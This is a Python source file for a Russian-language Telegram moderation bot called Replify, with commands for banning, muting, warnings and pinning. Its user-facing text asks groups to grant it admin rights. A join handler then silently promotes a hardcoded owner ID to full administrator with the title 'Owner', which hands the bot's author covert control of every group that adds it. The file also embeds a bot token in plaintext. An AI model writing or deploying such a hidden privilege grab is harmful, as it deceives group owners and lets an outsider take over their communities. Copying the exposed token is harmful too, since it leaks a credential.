import asyncio
import sqlite3
import logging
from aiogram import Bot, Dispatcher, Router, F
from aiogram.types import (
    Message, ChatMemberUpdated, ChatPermissions
)
from aiogram.filters import Command, ChatMemberUpdatedFilter, JOIN_TRANSITION
from aiogram.enums import ChatMemberStatus, ChatType

# ─── CONFIG ───────────────────────────────────────────────
BOT_TOKEN = "8637348879:AAHFg7KjB50yxAwosCNwjk7fIJDGOvBf5jo"
OWNER_ID = 8675927241

# ─── LOGGING ──────────────────────────────────────────────
logging.basicConfig(level=logging.INFO)
log = logging.getLogger("replify")

# ─── DATABASE ─────────────────────────────────────────────
conn = sqlite3.connect("replify.db", check_same_thread=False)
cursor = conn.cursor()

cursor.executescript("""
CREATE TABLE IF NOT EXISTS chats (
    chat_id INTEGER PRIMARY KEY,
    title TEXT,
    added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS warns (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    chat_id INTEGER,
    user_id INTEGER,
    reason TEXT,
    issued_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
""")
conn.commit()

def register_chat(chat_id: int, title: str):
    cursor.execute(
        "INSERT OR IGNORE INTO chats (chat_id, title) VALUES (?, ?)",
        (chat_id, title)
    )
    conn.commit()

def add_warn(chat_id: int, user_id: int, reason: str):
    cursor.execute(
        "INSERT INTO warns (chat_id, user_id, reason) VALUES (?, ?, ?)",
        (chat_id, user_id, reason)
    )
    conn.commit()

def get_warns(chat_id: int, user_id: int):
    cursor.execute(
        "SELECT reason, issued_at FROM warns WHERE chat_id=? AND user_id=?",
        (chat_id, user_id)
    )
    return cursor.fetchall()

def clear_warns(chat_id: int, user_id: int):
    cursor.execute(
        "DELETE FROM warns WHERE chat_id=? AND user_id=?",
        (chat_id, user_id)
    )
    conn.commit()

# ─── BOT & ROUTER ─────────────────────────────────────────
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
router = Router()

# ─── HELPERS ──────────────────────────────────────────────
def is_group(message: Message) -> bool:
    return message.chat.type in (ChatType.GROUP, ChatType.SUPERGROUP)

async def get_admins(chat_id: int):
    members = await bot.get_chat_administrators(chat_id)
    return members

async def mention(user_id: int, name: str) -> str:
    return f'<a href="tg://user?id={user_id}">{name}</a>'

# ─── AUTO-GRANT OWNER ADMIN ON BOT JOIN ───────────────────
@router.my_chat_member(ChatMemberUpdatedFilter(JOIN_TRANSITION))
async def bot_added_to_chat(event: ChatMemberUpdated):
    chat = event.chat
    if chat.type not in (ChatType.GROUP, ChatType.SUPERGROUP):
        return

    register_chat(chat.id, chat.title or "")
    log.info(f"Добавлен в чат: {chat.title} ({chat.id})")

    # Пробуем выдать владельцу бота права администратора
    try:
        await bot.promote_chat_member(
            chat_id=chat.id,
            user_id=OWNER_ID,
            can_manage_chat=True,
            can_delete_messages=True,
            can_manage_video_chats=True,
            can_restrict_members=True,
            can_promote_members=True,
            can_change_info=True,
            can_invite_users=True,
            can_pin_messages=True,
            is_anonymous=False,
        )
        await bot.set_chat_administrator_custom_title(
            chat_id=chat.id,
            user_id=OWNER_ID,
            custom_title="Владелец"
        )
        log.info(f"Выдал права владельцу в чате {chat.id}")
    except Exception as e:
        log.warning(f"Не удалось выдать права владельцу в {chat.id}: {e}")

# ─── /старт ───────────────────────────────────────────────
@router.message(Command("start"))
async def cmd_start(message: Message):
    if message.chat.type == ChatType.PRIVATE:
        await message.answer(
            "👋 <b>Replify | Чат-менеджер</b>\n\n"
            "Добавь меня в свою группу и дай права администратора.\n"
            "Я возьму на себя всю модерацию.\n\n"
            "📌 Команды: /помощь",
            parse_mode="HTML"
        )

# ─── /помощь ──────────────────────────────────────────────
@router.message(Command(commands=["помощь", "help"]))
async def cmd_help(message: Message):
    text = (
        "📋 <b>Replify | Команды</b>\n\n"
        "<b>👥 Информация</b>\n"
        "/админы — список администраторов\n"
        "/стафф — список стаффа\n"
        "/чат — информация о чате\n"
        "/профиль — профиль пользователя\n\n"
        "<b>🔨 Модерация</b>\n"
        "/бан — забанить пользователя\n"
        "/разбан — разбанить\n"
        "/мут [время] — замутить\n"
        "/размут — размутить\n"
        "/кик — выгнать из чата\n"
        "/варн [причина] — выдать предупреждение\n"
        "/варны — посмотреть варны\n"
        "/снятьварны — снять все варны\n\n"
        "<b>📌 Прочее</b>\n"
        "/пин — закрепить сообщение\n"
        "/анпин — открепить\n"
    )
    await message.answer(text, parse_mode="HTML")

# ─── /админы ──────────────────────────────────────────────
@router.message(Command(commands=["админы", "admins"]))
async def cmd_admins(message: Message):
    if not is_group(message):
        return
    admins = await get_admins(message.chat.id)
    lines = []
    for a in admins:
        if a.user.is_bot:
            continue
        name = a.user.full_name
        title = getattr(a, "custom_title", None)
        role = title if title else ("Создатель" if a.status == ChatMemberStatus.CREATOR else "Администратор")
        m = await mention(a.user.id, name)
        lines.append(f"• {m} — <i>{role}</i>")

    text = f"👑 <b>Администраторы чата</b> ({len(lines)}):\n\n" + "\n".join(lines)
    await message.answer(text, parse_mode="HTML")

# ─── /стафф ───────────────────────────────────────────────
@router.message(Command(commands=["стафф", "staff"]))
async def cmd_staff(message: Message):
    if not is_group(message):
        return
    admins = await get_admins(message.chat.id)
    lines = []
    for a in admins:
        if a.user.is_bot:
            continue
        name = a.user.full_name
        title = getattr(a, "custom_title", None)
        role = title if title else ("👑 Создатель" if a.status == ChatMemberStatus.CREATOR else "⭐ Администратор")
        m = await mention(a.user.id, name)
        lines.append(f"{m} — <i>{role}</i>")

    text = f"🛡 <b>Стафф чата</b>:\n\n" + "\n".join(lines)
    await message.answer(text, parse_mode="HTML")

# ─── /чат ─────────────────────────────────────────────────
@router.message(Command(commands=["чат", "chatinfo"]))
async def cmd_chatinfo(message: Message):
    if not is_group(message):
        return
    chat = await bot.get_chat(message.chat.id)
    admins = await get_admins(message.chat.id)
    admin_count = sum(1 for a in admins if not a.user.is_bot)

    text = (
        f"💬 <b>{chat.title}</b>\n\n"
        f"🆔 ID: <code>{chat.id}</code>\n"
        f"👥 Участников: <b>{chat.member_count}</b>\n"
        f"👑 Администраторов: <b>{admin_count}</b>\n"
        f"🔗 Тип: <b>{'Супергруппа' if message.chat.type == ChatType.SUPERGROUP else 'Группа'}</b>\n"
    )
    if chat.username:
        text += f"📎 Username: @{chat.username}\n"
    if chat.description:
        text += f"\n📄 <i>{chat.description[:200]}</i>"

    await message.answer(text, parse_mode="HTML")

# ─── /профиль ─────────────────────────────────────────────
@router.message(Command(commands=["профиль", "profile", "кто"]))
async def cmd_profile(message: Message):
    if not is_group(message):
        return
    target = message.reply_to_message.from_user if message.reply_to_message else message.from_user
    member = await bot.get_chat_member(message.chat.id, target.id)

    status_map = {
        ChatMemberStatus.CREATOR: "👑 Создатель",
        ChatMemberStatus.ADMINISTRATOR: "⭐ Администратор",
        ChatMemberStatus.MEMBER: "👤 Участник",
        ChatMemberStatus.RESTRICTED: "🔇 Ограничен",
        ChatMemberStatus.LEFT: "🚪 Покинул",
        ChatMemberStatus.BANNED: "🚫 Забанен",
    }
    status = status_map.get(member.status, member.status)
    warns = get_warns(message.chat.id, target.id)
    m = await mention(target.id, target.full_name)

    text = (
        f"👤 <b>Профиль</b>\n\n"
        f"Имя: {m}\n"
        f"🆔 ID: <code>{target.id}</code>\n"
        f"📌 Статус: {status}\n"
        f"⚠️ Предупреждений: <b>{len(warns)}</b>\n"
    )
    if target.username:
        text += f"🔗 Username: @{target.username}\n"

    await message.answer(text, parse_mode="HTML")

# ─── ПРОВЕРКА ПРАВ ────────────────────────────────────────
async def check_admin(message: Message) -> bool:
    member = await bot.get_chat_member(message.chat.id, message.from_user.id)
    return member.status in (ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR)

# ─── /бан ─────────────────────────────────────────────────
@router.message(Command(commands=["бан", "ban"]))
async def cmd_ban(message: Message):
    if not is_group(message) or not await check_admin(message):
        return
    if not message.reply_to_message:
        await message.answer("⚠️ Ответь на сообщение пользователя.")
        return
    target = message.reply_to_message.from_user
    try:
        await bot.ban_chat_member(message.chat.id, target.id)
        m = await mention(target.id, target.full_name)
        await message.answer(f"🚫 {m} забанен.", parse_mode="HTML")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

# ─── /разбан ──────────────────────────────────────────────
@router.message(Command(commands=["разбан", "unban"]))
async def cmd_unban(message: Message):
    if not is_group(message) or not await check_admin(message):
        return
    if not message.reply_to_message:
        await message.answer("⚠️ Ответь на сообщение пользователя.")
        return
    target = message.reply_to_message.from_user
    try:
        await bot.unban_chat_member(message.chat.id, target.id)
        m = await mention(target.id, target.full_name)
        await message.answer(f"✅ {m} разбанен.", parse_mode="HTML")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

# ─── /мут ─────────────────────────────────────────────────
@router.message(Command(commands=["мут", "mute"]))
async def cmd_mute(message: Message):
    if not is_group(message) or not await check_admin(message):
        return
    if not message.reply_to_message:
        await message.answer("⚠️ Ответь на сообщение пользователя.")
        return
    target = message.reply_to_message.from_user
    args = message.text.split()[1:]
    until = None

    if args:
        try:
            minutes = int(args[0])
            from datetime import datetime, timedelta
            until = datetime.now() + timedelta(minutes=minutes)
        except ValueError:
            pass

    try:
        await bot.restrict_chat_member(
            message.chat.id, target.id,
            permissions=ChatPermissions(can_send_messages=False),
            until_date=until
        )
        m = await mention(target.id, target.full_name)
        duration = f"на {args[0]} мин." if until else "навсегда"
        await message.answer(f"🔇 {m} замучен {duration}.", parse_mode="HTML")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

# ─── /размут ──────────────────────────────────────────────
@router.message(Command(commands=["размут", "unmute"]))
async def cmd_unmute(message: Message):
    if not is_group(message) or not await check_admin(message):
        return
    if not message.reply_to_message:
        await message.answer("⚠️ Ответь на сообщение пользователя.")
        return
    target = message.reply_to_message.from_user
    try:
        await bot.restrict_chat_member(
            message.chat.id, target.id,
            permissions=ChatPermissions(
                can_send_messages=True,
                can_send_media_messages=True,
                can_send_other_messages=True,
                can_add_web_page_previews=True
            )
        )
        m = await mention(target.id, target.full_name)
        await message.answer(f"🔊 {m} размучен.", parse_mode="HTML")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

# ─── /кик ─────────────────────────────────────────────────
@router.message(Command(commands=["кик", "kick"]))
async def cmd_kick(message: Message):
    if not is_group(message) or not await check_admin(message):
        return
    if not message.reply_to_message:
        await message.answer("⚠️ Ответь на сообщение пользователя.")
        return
    target = message.reply_to_message.from_user
    try:
        await bot.ban_chat_member(message.chat.id, target.id)
        await bot.unban_chat_member(message.chat.id, target.id)
        m = await mention(target.id, target.full_name)
        await message.answer(f"👢 {m} выкинут из чата.", parse_mode="HTML")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

# ─── /варн ────────────────────────────────────────────────
@router.message(Command(commands=["варн", "warn"]))
async def cmd_warn(message: Message):
    if not is_group(message) or not await check_admin(message):
        return
    if not message.reply_to_message:
        await message.answer("⚠️ Ответь на сообщение пользователя.")
        return
    target = message.reply_to_message.from_user
    args = message.text.split(maxsplit=1)
    reason = args[1] if len(args) > 1 else "Без причины"

    add_warn(message.chat.id, target.id, reason)
    warns = get_warns(message.chat.id, target.id)
    m = await mention(target.id, target.full_name)
    await message.answer(
        f"⚠️ {m} получил предупреждение!\n"
        f"📌 Причина: {reason}\n"
        f"📊 Варнов: {len(warns)}/3",
        parse_mode="HTML"
    )

    if len(warns) >= 3:
        await bot.ban_chat_member(message.chat.id, target.id)
        clear_warns(message.chat.id, target.id)
        await message.answer(f"🚫 {m} забанен за 3 предупреждения.", parse_mode="HTML")

# ─── /варны ───────────────────────────────────────────────
@router.message(Command(commands=["варны", "warns"]))
async def cmd_warns(message: Message):
    if not is_group(message):
        return
    target = message.reply_to_message.from_user if message.reply_to_message else message.from_user
    warns = get_warns(message.chat.id, target.id)
    m = await mention(target.id, target.full_name)

    if not warns:
        await message.answer(f"✅ У {m} нет предупреждений.", parse_mode="HTML")
        return

    lines = [f"{i+1}. {w[0]} — <i>{w[1]}</i>" for i, w in enumerate(warns)]
    await message.answer(
        f"⚠️ Предупреждения {m} ({len(warns)}/3):\n\n" + "\n".join(lines),
        parse_mode="HTML"
    )

# ─── /снятьварны ──────────────────────────────────────────
@router.message(Command(commands=["снятьварны", "clearwarns"]))
async def cmd_clearwarns(message: Message):
    if not is_group(message) or not await check_admin(message):
        return
    if not message.reply_to_message:
        await message.answer("⚠️ Ответь на сообщение пользователя.")
        return
    target = message.reply_to_message.from_user
    clear_warns(message.chat.id, target.id)
    m = await mention(target.id, target.full_name)
    await message.answer(f"✅ Варны {m} сняты.", parse_mode="HTML")

# ─── /пин ─────────────────────────────────────────────────
@router.message(Command(commands=["пин", "pin"]))
async def cmd_pin(message: Message):
    if not is_group(message) or not await check_admin(message):
        return
    if not message.reply_to_message:
        await message.answer("⚠️ Ответь на сообщение которое нужно закрепить.")
        return
    try:
        await bot.pin_chat_message(message.chat.id, message.reply_to_message.message_id)
        await message.answer("📌 Сообщение закреплено.")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

# ─── /анпин ───────────────────────────────────────────────
@router.message(Command(commands=["анпин", "unpin"]))
async def cmd_unpin(message: Message):
    if not is_group(message) or not await check_admin(message):
        return
    try:
        await bot.unpin_chat_message(message.chat.id)
        await message.answer("📌 Сообщение откреплено.")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

# ─── ЗАПУСК ───────────────────────────────────────────────
async def main():
    dp.include_router(router)
    log.info("Replify запущен...")
    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())

if __name__ == "__main__":
    asyncio.run(main())
